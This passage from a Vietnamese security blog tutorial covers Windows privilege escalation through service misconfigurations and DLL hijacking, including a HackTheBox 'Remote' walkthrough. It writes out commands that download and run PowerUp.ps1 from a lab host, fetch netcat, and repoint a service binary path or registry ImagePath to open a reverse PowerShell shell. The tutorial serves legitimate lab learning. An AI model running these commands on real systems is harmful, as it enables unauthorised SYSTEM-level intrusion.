</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>reg add &#34;HKLM\System\CurrentControlSet\services\wuauserv&#34; /t REG_EXPAND_SZ /v ImagePath /d &#34;C:\temp\nc.exe &lt;ip&gt; &lt;port&gt; -e powershell&#34; /f
</span></span></code></pre></td></tr></table></div></div><p>Tiến hành lắng nghe trên port và khởi động lại dịch vụ <strong>wuauserv</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sc.exe start wuauserv
</span></span></code></pre></td></tr></table></div></div><p>hoặc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Start-Service wuauserv
</span></span></code></pre></td></tr></table></div></div><p><a href=https://0xbadcode.ml/uploads/images/gallery/2020-06/1_7us7pUKeufCulxiUVMI3Kg.png><img alt=1_7us7pUKeufCulxiUVMI3Kg.png loading=lazy src=https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_7us7pUKeufCulxiUVMI3Kg.png></a></p><blockquote><p>Ví dụ 2: <a href=https://youtu.be/TDgQzcjFeME>https://youtu.be/TDgQzcjFeME</a></p></blockquote><h2 id=weak-service-permissions-insecure-service-properties>Weak Service Permissions (Insecure Service Properties)<a hidden class=anchor aria-hidden=true href=#weak-service-permissions-insecure-service-properties>#</a></h2><h3 id=nguyên-nhân-2>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-2>#</a></h3><p>Những services được tạo bởi SYSTEM có weak permissions có thể dẫn đến privilege escalation. Nếu một user có quyền thấp hơn nhưng mà lại có thể chỉnh sửa config của services đó, ở đây đang nói đến là thay đổi được <code>binPath</code>. Lúc này attacker có thể chỉnh sửa <code>binPath</code> dẫn tới một chương trình có chứa payload độc hại và khởi động lại service đó, chương trình độc hại sẽ được thực thi với quyền SYSTEM. Chương trình độc hại có thể chứa payload kết nối ra bên ngoài, attacker lúc này đã có thể sử dụng quyền SYSTEM.</p><h3 id=khai-thác-2>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-2>#</a></h3><p>Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn</p><h4 id=ví-dụ-remote-hackthebox>Ví dụ: Remote (hackthebox)<a hidden class=anchor aria-hidden=true href=#ví-dụ-remote-hackthebox>#</a></h4><p>Kiểm tra dịch vụ Weak Service Permissions (ngoài PowerUp có thể sử dụng winPEAS cũng có thể phát hiện ra)</p><p><code>powershell -c "iex(new-object net.webclient).downloadstring('http://10.10.14.91:8888/PowerUp.ps1'); Invoke-AllChecks"</code></p><p>Kết quả:</p><p><img loading=lazy src=https://images.viblo.asia/f99faef0-e5a1-463f-a142-92e7060b94fa.png></p><p>Service exploit là <strong>UsoSvc</strong>.</p><p>Kéo nc về:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=n>mkdir</span> <span class=n>temp</span>
</span></span><span class=line><span class=cl><span class=nb>invoke-webrequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>91</span><span class=err>:</span><span class=mf>8888</span><span class=p>/</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>-OutFile</span> <span class=n>c:</span><span class=p>\</span><span class=n>temp</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span>
</span></span></code></pre></td></tr></table></div></div><p>Lưu ý cần tạo <strong>/temp/</strong> trước</p><p>Tại local tạo file <strong>.bat</strong> như sau:</p><p><img loading=lazy src=https://images.viblo.asia/a9d37755-768c-474a-ac75-72438b9fe5f1.png></p><p>Kéo nó lên machine:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=nb>invoke-webrequest</span> <span class=n>-Uri</span> <span class=n>http</span><span class=err>:</span><span class=p>//</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>91</span><span class=err>:</span><span class=mf>8888</span><span class=p>/</span><span class=n>connect</span><span class=p>.</span><span class=py>bat</span> <span class=n>-OutFile</span> <span class=n>c:</span><span class=p>\</span><span class=n>temp</span><span class=p>\</span><span class=n>connect</span><span class=p>.</span><span class=py>bat</span>
</span></span></code></pre></td></tr></table></div></div><p>Gán binpath cho <strong>UsoSvc</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=n>sc</span><span class=p>.</span><span class=py>exe</span> <span class=n>config</span> <span class=n>UsoSvc</span> <span class=n>binpath</span><span class=p>=</span> <span class=s2>&#34;C:\temp\connect.bat&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>Listen trên máy local và chạy <strong>UsoSvc</strong>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Powershell data-lang=Powershell><span class=line><span class=cl><span class=n>sc</span><span class=p>.</span><span class=py>exe</span> <span class=nb>start </span><span class=n>UsoSvc</span>
</span></span></code></pre></td></tr></table></div></div><p>Kết quả:</p><p><img loading=lazy src=https://images.viblo.asia/b72b4284-f392-431e-b177-d7ba39c49b4d.png></p><h2 id=dll-hijacking>DLL Hijacking<a hidden class=anchor aria-hidden=true href=#dll-hijacking>#</a></h2><h3 id=nguyên-nhân-3>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-3>#</a></h3><p>Một chương trình Windows sẽ tìm kiếm file DLL khi nó được khởi động. Nếu các DLL này không tồn tại thì có thể nhắm đến và khai thác. Chúng ta có thể tạo 1 file DLL độc hại vào vị trí mà chương trình đó đang tìm kiếm và khởi động, lúc này ta sẽ có quyền của người khởi động chương trình.</p><p>Một chương trình Windows sẽ sử dụng các đường dẫn đã được defined từ trước để tìm kiếm các file DLL, và nó sẽ kiểm tra các đường dẫn này theo một thứ tự cụ thể</p><ol><li>The directory from which the application loaded</li><li>32-bit System directory (C:\Windows\System32)</li><li>16-bit System directory (C:\Windows\System)</li><li>Windows directory (C:\Windows)</li><li>The current working directory (CWD)</li><li>Directories in the PATH environment variable (first system and then user)</li></ol><p><a href=https://0xbadcode.ml/uploads/images/gallery/2020-06/1__BXH1Via6L41eMidTvXRdQ.png><img alt=1__BXH1Via6L41eMidTvXRdQ.png loading=lazy src=https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1__BXH1Via6L41eMidTvXRdQ.png></a></p><p><a href=https://0xbadcode.ml/uploads/images/gallery/2020-06/MinhTuan-2020-06-09-13-52-52-1067x127.png><img alt=MinhTuan-2020-06-09-13-52-52-1067x127.png loading=lazy src=https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/MinhTuan-2020-06-09-13-52-52-1067x127.png></a></p><h3 id=khai-thác-3>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-3>#</a></h3><p>Chúng ta có thể sử dụng PowerUp hoặc winPEAS để có thể phát hiện ra lỗ hổng DLL hijacking. Thông thường, chúng ta có thể sư dụng chức năng Write-HijackDll của PowerUp để viết ra một file DLL độc hại và khởi động lại chương trình. Khi chương trình được khởi động, nó sẽ load file DLL độc hại và execute code với quyền cao hơn.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Write-HijackDll -DllPath &#39;C:\Temp\wlbsctrl.dll&#39;
</span></span></code></pre></td></tr></table></div></div><p>Hoặc nếu không muốn sử dụng công cụ thì có thể làm bằng tay theo cách này <a href=https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5>https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5</a></p><p>Tuy nhiên có thể đây là ngõ cụt nếu bạn có thể tiêm được file DLL nhưng không có cách nào khởi động chương trình như trong bài này <a href=https://0xdf.gitlab.io/2019/06/22/htb-querier.html>https://0xdf.gitlab.io/2019/06/22/htb-querier.html</a></p><p>Chi tiết hơn kiểu tấn công này có thể đọc tại</p><ul><li><a href=https://hacknpentest.com/windows-privilege-escalation-dll-hijacking/>https://hacknpentest.com/windows-privilege-escalation-dll-hijacking/</a></li><li><a href=https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e>https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e</a></li><li><a href=https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456>https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456</a></li></ul><blockquote><p>Ví dụ: <a href=https://youtu.be/9s8jYwx9FSA>https://youtu.be/9s8jYwx9FSA</a></p></blockquote><h2 id=insecure-service-executables>Insecure Service Executables<a hidden class=anchor aria-hidden=true href=#insecure-service-executables>#</a></h2><h3 id=nguyên-nhân-4>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-4>#</a></h3><p>Nguyên nhân chính là do SYSTEM cài đặt lên dịch vụ không an toàn (có lỗ hổng) lên machine, attacker có thể khai thác lỗ hổng đó và chiếm được quyền SYSTEM</p><h3 id=khai-thác-4>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-4>#</a></h3><p>Với mỗi service/program thì cách khai thác lại khác nhau. Tuy nhiên mô hình chung chúng ta sẽ đi theo con đường như sau:</p><ul><li>Tìm kiếm dịch vụ nào thú vị (nghi ngờ)</li><li>Kiểm tra xem dịch vụ đó có cách khai thác được public hay chưa (ví dụ như được quyền ghi đè file DLL, thực thi code không cần xác thực, có quyền đối với các thư mục nhất định, &mldr;)</li><li>Thực hiện exploit để thực thi hoặc xem được những thứ cao hơn &mldr;</li></ul><h1 id=kết-luận>Kết luận<a hidden class=anchor aria-hidden=true href=#kết-luận>#</a></h1><p>Vậy là đã hết phần 1 với series <strong>Windows Privilege Escalation</strong>, nếu có điều gì băn khoăn hay bài viết của mình có điều gì sai sót mọi người comment bên dưới nhé. Cảm ơn tất cả mọi người đã đọc bài viết. Happy hacking!.</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://minhtuanact.github.io/tags/privilege-escalation/>Privilege Escalation</a></li><li><a href=https://minhtuanact.github.io/tags/service/>Service</a></li><li><a href=https://minhtuanact.github.io/tags/windows/>Windows</a></li><li><a href=https://minhtuanact.github.io/tags/exploits/>Exploits</a></li></ul><nav class=paginav><a class=prev href=https://minhtuanact.github.io/posts/hackthebox-writeup-book/><span class=title>« Prev</span><br><span>[Hackthebox- Writeup] Book</span>
</a><a class=next href=https://minhtuanact.github.io/posts/lam-the-nao-de-rce-tren-windows-tu-linux/><span class=title>Next »</span><br><span>Làm thế nào để RCE trên Windows từ Linux?</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on x" href="https://x.com/intent/tweet/?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f&amp;hashtags=PrivilegeEscalation%2cService%2cwindows%2cExploits"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f&amp;title=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits&amp;summary=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits&amp;source=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f&title=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on whatsapp" href="https://api.whatsapp.com/send?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits%20-%20https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on telegram" href="https://telegram.me/share/url?text=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits&amp;url=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits on ycombinator" href="https://news.ycombinator.com/submitlink?t=Leo%20thang%20%c4%91%e1%ba%b7c%20quy%e1%bb%81n%20trong%20Windows%20-%20Windows%20Privilege%20Escalation%20%231%3a%20Service%20Exploits&u=https%3a%2f%2fminhtuanact.github.io%2fposts%2fleo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://minhtuanact.github.io/>minhtuanact|Blog - Keep a flame in the rain!</a></span> ·
Like a locksmith studying the art of keys, I share knowledge to illuminate, not to break. ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>